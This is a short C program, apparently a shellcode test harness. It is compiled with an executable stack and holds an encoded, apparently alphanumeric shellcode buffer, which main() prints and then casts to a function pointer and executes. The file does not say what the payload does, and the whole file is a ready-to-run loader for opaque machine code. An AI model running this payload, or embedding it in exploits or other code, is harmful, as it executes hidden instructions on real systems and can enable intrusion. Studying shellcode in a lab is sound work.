// gcc -m32 -z execstack -fPIE -pie -z now test3.c -o test3
char *buf="\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x56"
"\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30"
"\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42"
"\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x56"
"\x51\x4f\x39\x4a\x57\x4b\x51\x58\x30\x44\x4b\x53\x58\x56\x4f"
"\x33\x43\x52\x48\x55\x50\x43\x58\x56\x4f\x52\x42\x53\x59\x32"
"\x4e\x4b\x39\x4d\x33\x48\x4d\x4b\x30\x41\x41";
int main() { 
    printf("Shellcode Length: %d\n", strlen(buf)); 
    printf("%s\n",buf);
    int (*ret)() = (int(*)())buf; ret(); 
}